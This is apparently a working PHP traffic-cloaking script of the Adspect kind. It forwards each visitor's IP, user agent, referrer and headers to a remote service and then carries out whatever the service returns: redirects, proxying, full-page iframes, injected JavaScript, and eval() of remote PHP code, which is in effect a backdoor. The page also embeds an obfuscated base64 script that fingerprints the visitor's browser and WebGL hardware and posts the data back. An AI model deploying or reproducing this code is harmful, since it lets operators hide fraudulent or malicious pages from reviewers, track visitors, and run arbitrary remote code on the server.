<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('076445b4-d012-46d3-9f8e-47e99428596f', 'redirect', '_', base64_decode('W9VAPuQ7nJRo5w2O8ACoNWWXBUKhBmEo8AzjUDVOJjM=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weGI5MDY9WycxMXRBcWpkUycsJzJvYkJXVmUnLCdwdXNoJywnb2JqZWN0JywnNTY2NjQ0S3FySEh4JywnZnVuY3Rpb24nLCdmb3JtJywnTm90aWZpY2F0aW9uJywnY2FudmFzJywnZ2V0Q29udGV4dCcsJ2lucHV0JywnOTc1MzdHVkJ6TUUnLCd0b1N0cmluZycsJzExMzZsSkprYVQnLCdUb3VjaEV2ZW50JywnMW9xcmpSRCcsJ25vZGVOYW1lJywnbmFtZScsJ3RpbWV6b25lT2Zmc2V0JywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdsb2cnLCdjcmVhdGVFbGVtZW50JywnY29uc29sZScsJ2xlbmd0aCcsJ2RvY3VtZW50RWxlbWVudCcsJ25vdGlmaWNhdGlvbnMnLCd2YWx1ZScsJzMwNjk3ME91VXNxUicsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ3N1Ym1pdCcsJ3RvdWNoRXZlbnQnLCdoaWRkZW4nLCdhdHRyaWJ1dGVzJywnc2NyZWVuJywndG9zdHJpbmcnLCdtZXRob2QnLCcxbE5WdnlZJywnZ2V0UGFyYW1ldGVyJywndHlwZScsJ3F1ZXJ5Jywnbm9kZVZhbHVlJywndGhlbicsJ25hdmlnYXRvcicsJ2RvY3VtZW50JywnYm9keScsJ21lc3NhZ2UnLCdkYXRhJywnMWNIUmFDRicsJ2FwcGVuZENoaWxkJywnaHJlZicsJ3Blcm1pc3Npb25zJywncGVybWlzc2lvbicsJ3dlYmdsJywnMzAyNzlJT0hyeEEnLCdsb2NhdGlvbicsJ2FjdGlvbicsJzc5ODM4M2R4cUVBZCcsJ3N0cmluZ2lmeScsJzI4OTYzamxWY0JVJ107dmFyIF8weDRhMDM9ZnVuY3Rpb24oXzB4NDQxYTk0LF8weDExODRlNyl7XzB4NDQxYTk0PV8weDQ0MWE5NC0weGUzO3ZhciBfMHhiOTA2OWE9XzB4YjkwNltfMHg0NDFhOTRdO3JldHVybiBfMHhiOTA2OWE7fTsoZnVuY3Rpb24oXzB4NTU3ZGU2LF8weDRkZDE4Yyl7dmFyIF8weGY4MzY2Yj1fMHg0YTAzO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MWYyZjhiPS1wYXJzZUludChfMHhmODM2NmIoMHhmMykpKnBhcnNlSW50KF8weGY4MzY2YigweGY1KSkrLXBhcnNlSW50KF8weGY4MzY2YigweGY4KSkrcGFyc2VJbnQoXzB4ZjgzNjZiKDB4MTAxKSkqLXBhcnNlSW50KF8weGY4MzY2YigweGY0KSkrLXBhcnNlSW50KF8weGY4MzY2YigweGYxKSkqLXBhcnNlSW50KF8weGY4MzY2YigweDExOCkpK3BhcnNlSW50KF8weGY4MzY2YigweGVlKSkqcGFyc2VJbnQoXzB4ZjgzNjZiKDB4ZTgpKStwYXJzZUludChfMHhmODM2NmIoMHgxMDMpKSotcGFyc2VJbnQoXzB4ZjgzNjZiKDB4ZmYpKStwYXJzZUludChfMHhmODM2NmIoMHgxMGYpKTtpZihfMHgxZjJmOGI9PT1fMHg0ZGQxOGMpYnJlYWs7ZWxzZSBfMHg1NTdkZTZbJ3B1c2gnXShfMHg1NTdkZTZbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDNhZDBlMSl7XzB4NTU3ZGU2WydwdXNoJ10oXzB4NTU3ZGU2WydzaGlmdCddKCkpO319fShfMHhiOTA2LDB4NjFlODUpLGZ1bmN0aW9uKCl7dmFyIF8weDM2MzQ4ND1fMHg0YTAzO2Z1bmN0aW9uIF8weGQ3OWRjNSgpe3ZhciBfMHgyYjAzNWY9XzB4NGEwMztfMHgyMDE2YmZbJ2Vycm9ycyddPV8weDMxZjQ4ODt2YXIgXzB4NDAwMzQ3PWRvY3VtZW50WydjcmVhdGVFbGVtZW50J10oXzB4MmIwMzVmKDB4ZmEpKSxfMHgyNjljOWI9ZG9jdW1lbnRbXzB4MmIwMzVmKDB4MTA5KV0oXzB4MmIwMzVmKDB4ZmUpKTtfMHg0MDAzNDdbXzB4MmIwMzVmKDB4MTE3KV09J1BPU1QnLF8weDQwMDM0N1tfMHgyYjAzNWYoMHhmMCldPXdpbmRvd1snbG9jYXRpb24nXVtfMHgyYjAzNWYoMHhlYSldLF8weDI2OWM5YltfMHgyYjAzNWYoMHgxMWEpXT1fMHgyYjAzNWYoMHgxMTMpLF8weDI2OWM5YltfMHgyYjAzNWYoMHgxMDUpXT1fMHgyYjAzNWYoMHhlNyksXzB4MjY5YzliW18weDJiMDM1ZigweDEwZSldPUpTT05bXzB4MmIwMzVmKDB4ZjIpXShfMHgyMDE2YmYpLF8weDQwMDM0N1snYXBwZW5kQ2hpbGQnXShfMHgyNjljOWIpLGRvY3VtZW50W18weDJiMDM1ZigweGU1KV1bXzB4MmIwMzVmKDB4ZTkpXShfMHg0MDAzNDcpLF8weDQwMDM0N1tfMHgyYjAzNWYoMHgxMTEpXSgpO312YXIgXzB4MzFmNDg4PVtdLF8weDIwMTZiZj17fTt0cnl7dmFyIF8weDI5ZmZjYz1mdW5jdGlvbihfMHgyOWM1NzYpe3ZhciBfMHg0MzM0NmQ9XzB4NGEwMztpZihfMHg0MzM0NmQoMHhmNyk9PT10eXBlb2YgXzB4MjljNTc2JiZudWxsIT09XzB4MjljNTc2KXt2YXIgXzB4MTI1ZjM3PWZ1bmN0aW9uKF8weDcyMDIzYSl7dmFyIF8weDE3ZjYxOT1fMHg0MzM0NmQ7dHJ5e3ZhciBfMHgxMGVlYmM9XzB4MjljNTc2W18weDcyMDIzYV07c3dpdGNoKHR5cGVvZiBfMHgxMGVlYmMpe2Nhc2Unb2JqZWN0JzppZihudWxsPT09XzB4MTBlZWJjKWJyZWFrO2Nhc2UgXzB4MTdmNjE5KDB4ZjkpOl8weDEwZWViYz1fMHgxMGVlYmNbXzB4MTdmNjE5KDB4MTAwKV0oKTt9XzB4MzgyMmVhW18weDcyMDIzYV09XzB4MTBlZWJjO31jYXRjaChfMHgyNjllZTcpe18weDMxZjQ4OFtfMHgxN2Y2MTkoMHhmNildKF8weDI2OWVlN1tfMHgxN2Y2MTkoMHhlNildKTt9fSxfMHgzODIyZWE9e30sXzB4MWQ3OGEyO2ZvcihfMHgxZDc4YTIgaW4gXzB4MjljNTc2KV8weDEyNWYzNyhfMHgxZDc4YTIpO3RyeXt2YXIgXzB4NDFlNjk1PU9iamVjdFsnZ2V0T3duUHJvcGVydHlOYW1lcyddKF8weDI5YzU3Nik7Zm9yKF8weDFkNzhhMj0weDA7XzB4MWQ3OGEyPF8weDQxZTY5NVtfMHg0MzM0NmQoMHgxMGIpXTsrK18weDFkNzhhMilfMHgxMjVmMzcoXzB4NDFlNjk1W18weDFkNzhhMl0pO18weDM4MjJlYVsnISEnXT1fMHg0MWU2OTU7fWNhdGNoKF8weDFjNzQxYil7XzB4MzFmNDg4W18weDQzMzQ2ZCgweGY2KV0oXzB4MWM3NDFiW18weDQzMzQ2ZCgweGU2KV0pO31yZXR1cm4gXzB4MzgyMmVhO319O18weDIwMTZiZltfMHgzNjM0ODQoMHgxMTUpXT1fMHgyOWZmY2Mod2luZG93W18weDM2MzQ4NCgweDExNSldKSxfMHgyMDE2YmZbJ3dpbmRvdyddPV8weDI5ZmZjYyh3aW5kb3cpLF8weDIwMTZiZltfMHgzNjM0ODQoMHhlMyldPV8weDI5ZmZjYyh3aW5kb3dbXzB4MzYzNDg0KDB4ZTMpXSksXzB4MjAxNmJmW18weDM2MzQ4NCgweGVmKV09XzB4MjlmZmNjKHdpbmRvd1tfMHgzNjM0ODQoMHhlZildKSxfMHgyMDE2YmZbJ2NvbnNvbGUnXT1fMHgyOWZmY2Mod2luZG93W18weDM2MzQ4NCgweDEwYSldKSxfMHgyMDE2YmZbXzB4MzYzNDg0KDB4MTBjKV09ZnVuY3Rpb24oXzB4MmQ0ZjI3KXt2YXIgXzB4MzBlMWE0PV8weDM2MzQ4NDt0cnl7dmFyIF8weDM3Yzk1ZT17fTtfMHgyZDRmMjc9XzB4MmQ0ZjI3W18weDMwZTFhNCgweDExNCldO2Zvcih2YXIgXzB4YTdjZGIxIGluIF8weDJkNGYyNylfMHhhN2NkYjE9XzB4MmQ0ZjI3W18weGE3Y2RiMV0sXzB4MzdjOTVlW18weGE3Y2RiMVtfMHgzMGUxYTQoMHgxMDQpXV09XzB4YTdjZGIxW18weDMwZTFhNCgweDExYyldO3JldHVybiBfMHgzN2M5NWU7fWNhdGNoKF8weDMxNDdlOCl7XzB4MzFmNDg4WydwdXNoJ10oXzB4MzE0N2U4WydtZXNzYWdlJ10pO319KGRvY3VtZW50Wydkb2N1bWVudEVsZW1lbnQnXSksXzB4MjAxNmJmW18weDM2MzQ4NCgweGU0KV09XzB4MjlmZmNjKGRvY3VtZW50KTt0cnl7XzB4MjAxNmJmW18weDM2MzQ4NCgweDEwNildPW5ldyBEYXRlKClbJ2dldFRpbWV6b25lT2Zmc2V0J10oKTt9Y2F0Y2goXzB4MTQwMmRmKXtfMHgzMWY0ODhbXzB4MzYzNDg0KDB4ZjYpXShfMHgxNDAyZGZbJ21lc3NhZ2UnXSk7fXRyeXtfMHgyMDE2YmZbJ2Nsb3N1cmUnXT1mdW5jdGlvbigpe31bXzB4MzYzNDg0KDB4MTAwKV0oKTt9Y2F0Y2goXzB4MjdiMGMyKXtfMHgzMWY0ODhbXzB4MzYzNDg0KDB4ZjYpXShfMHgyN2IwYzJbXzB4MzYzNDg0KDB4ZTYpXSk7fXRyeXtfMHgyMDE2YmZbXzB4MzYzNDg0KDB4MTEyKV09ZG9jdW1lbnRbJ2NyZWF0ZUV2ZW50J10oXzB4MzYzNDg0KDB4MTAyKSlbXzB4MzYzNDg0KDB4MTAwKV0oKTt9Y2F0Y2goXzB4Mjg3YmQpe18weDMxZjQ4OFtfMHgzNjM0ODQoMHhmNildKF8weDI4N2JkW18weDM2MzQ4NCgweGU2KV0pO310cnl7XzB4MjlmZmNjPWZ1bmN0aW9uKCl7fTt2YXIgXzB4MTJlOTlhPTB4MDtfMHgyOWZmY2NbXzB4MzYzNDg0KDB4MTAwKV09ZnVuY3Rpb24oKXtyZXR1cm4rK18weDEyZTk5YSwnJzt9LGNvbnNvbGVbXzB4MzYzNDg0KDB4MTA4KV0oXzB4MjlmZmNjKSxfMHgyMDE2YmZbXzB4MzYzNDg0KDB4MTE2KV09XzB4MTJlOTlhO31jYXRjaChfMHhmMTBlYzEpe18weDMxZjQ4OFsncHVzaCddKF8weGYxMGVjMVtfMHgzNjM0ODQoMHhlNildKTt9d2luZG93W18weDM2MzQ4NCgweGUzKV1bXzB4MzYzNDg0KDB4ZWIpXVtfMHgzNjM0ODQoMHgxMWIpXSh7J25hbWUnOl8weDM2MzQ4NCgweDEwZCl9KVtfMHgzNjM0ODQoMHgxMWQpXShmdW5jdGlvbihfMHgxNDc3MDUpe3ZhciBfMHgyMjA5OTY9XzB4MzYzNDg0O18weDIwMTZiZltfMHgyMjA5OTYoMHhlYildPVt3aW5kb3dbXzB4MjIwOTk2KDB4ZmIpXVtfMHgyMjA5OTYoMHhlYyldLF8weDE0NzcwNVsnc3RhdGUnXV0sXzB4ZDc5ZGM1KCk7fSxfMHhkNzlkYzUpO3RyeXt2YXIgXzB4MzM3ZWFiPWRvY3VtZW50W18weDM2MzQ4NCgweDEwOSldKF8weDM2MzQ4NCgweGZjKSlbXzB4MzYzNDg0KDB4ZmQpXShfMHgzNjM0ODQoMHhlZCkpLF8weDQ4MGM5Nz1fMHgzMzdlYWJbJ2dldEV4dGVuc2lvbiddKCdXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvJyk7XzB4MjAxNmJmWyd3ZWJnbCddPXsndmVuZG9yJzpfMHgzMzdlYWJbXzB4MzYzNDg0KDB4MTE5KV0oXzB4NDgwYzk3W18weDM2MzQ4NCgweDExMCldKSwncmVuZGVyZXInOl8weDMzN2VhYltfMHgzNjM0ODQoMHgxMTkpXShfMHg0ODBjOTdbXzB4MzYzNDg0KDB4MTA3KV0pfTt9Y2F0Y2goXzB4NTg0MjYyKXtfMHgzMWY0ODhbXzB4MzYzNDg0KDB4ZjYpXShfMHg1ODQyNjJbXzB4MzYzNDg0KDB4ZTYpXSk7fX1jYXRjaChfMHgyMDMyNmIpe18weDMxZjQ4OFtfMHgzNjM0ODQoMHhmNildKF8weDIwMzI2YltfMHgzNjM0ODQoMHhlNildKSxfMHhkNzlkYzUoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;